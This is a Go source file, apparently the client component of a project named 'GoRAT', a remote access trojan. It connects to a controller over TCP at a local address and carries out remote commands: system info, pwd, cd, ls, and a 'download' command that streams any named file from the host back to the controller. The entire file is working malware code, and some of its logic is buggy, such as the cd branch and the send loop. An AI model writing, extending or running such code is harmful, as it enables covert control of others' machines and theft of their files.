package client

import (
	"GoRAT/internal/client/plugins"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
)

func Client() {

	conn, err := net.Dial("tcp", "127.0.0.1:1234")

	if err != nil {
		fmt.Println(err)
		return
	}

	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			fmt.Println(err)
			return
		}
	}(conn)
	buff := make([]byte, 1024)

	for {

		n, err := conn.Read(buff)
		if err != nil {
			fmt.Println(err)
			break
		}

		if string(buff[:n]) == "info" {
			text, err := plugins.Info()
			if err != nil {
				_, err = conn.Write([]byte(err.Error()))
				if err != nil {
					fmt.Println(err)
					return
				}
			}

			_, err = conn.Write([]byte(text))

			if err != nil {
				fmt.Println(err)
				return
			}
		} else if string(buff[:n]) == "pwd" {
			path, err := os.Getwd()
			if err != nil {
				_, err = conn.Write([]byte(err.Error()))
				if err != nil {
					fmt.Println(err)
					return
				}
			}

			_, err = conn.Write([]byte(path))

			if err != nil {
				fmt.Println(err)
				return
			}
		} else if strings.Contains(string(buff[:n]), "cd") {
			dir := strings.Split(string(buff[:n]), " ")

			if len(dir) != 2 {
				_, err = conn.Write([]byte("Wrong format."))

				if err != nil {
					fmt.Println(err)
					return
				}
			}

			err := os.Chdir(dir[1])

			if err != nil {
				_, err = conn.Write([]byte("Error to change directory " + err.Error()))

				if err != nil {
					fmt.Println(err)
					return
				}
			}

			_, err = conn.Write([]byte(fmt.Sprintf("Directory changed to '%s'", dir[1])))

			if err != nil {
				fmt.Println(err)
				return
			}

		} else if string(buff[:n]) == "ls" {
			pathEntries := ""
			path, err := os.Getwd()
			if err != nil {
				_, err = conn.Write([]byte(err.Error()))

				if err != nil {
					fmt.Println(err)
					return
				}
			}

			entries, err := os.ReadDir(path)
			if err != nil {
				_, err = conn.Write([]byte(err.Error()))

				if err != nil {
					fmt.Println(err)
					return
				}
			}

			if len(entries) == 0 {
				pathEntries = "directory is empty"
			} else {
				pathEntries += "directory files:\n"
				for _, e := range entries {
					pathEntries += "\n" + e.Name()
				}
			}

			_, err = conn.Write([]byte(pathEntries))

			if err != nil {
				fmt.Println(err)
				return
			}
		} else if strings.Contains(string(buff[:n]), "download") {

			dir := strings.Split(string(buff[:n]), " ")

			if len(dir) == 2 && dir[0] == "download" {
				file, err := os.Open(dir[1])
				if err != nil {
					fmt.Println(err)
					return
				}
				fileInfo, err := file.Stat()
				if err != nil {
					fmt.Println(err)
					return
				}

				fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
				fileName := fillString(fileInfo.Name(), 64)
				fmt.Println("Sending filename and filesize!")

				conn.Write([]byte(fileSize))
				conn.Write([]byte(fileName))
				sendBuffer := make([]byte, 1024)
				fmt.Println("Start sending file!")
				for {
					_, err = file.Read(sendBuffer)
					if err == io.EOF {
						break
					}
					conn.Write(sendBuffer)
				}
				file.Close()
				fmt.Println("File has been sent, closing connection!")

			}

			//
			//if len(dir) == 2 && dir[0] == "download" {
			//	file, err := os.Open(dir[1])
			//	data := make([]byte, 1024)
			//
			//	if err != nil {
			//		_, err = conn.Write([]byte(err.Error()))
			//
			//		if err != nil {
			//			fmt.Println(err)
			//			return
			//		}
			//	}
			//
			//	for {
			//		n, err := file.Read(data)
			//		if n == 0 || err != nil {
			//			fmt.Println(err)
			//			break
			//		}
			//		_, err = conn.Write(data[:n])
			//
			//		if err != nil {
			//			fmt.Println(err)
			//			break
			//		}
			//
			//	}
			//
			//	err = file.Close()
			//	if err != nil {
			//		return
			//	}
			//}
		}

	}

}

func fillString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
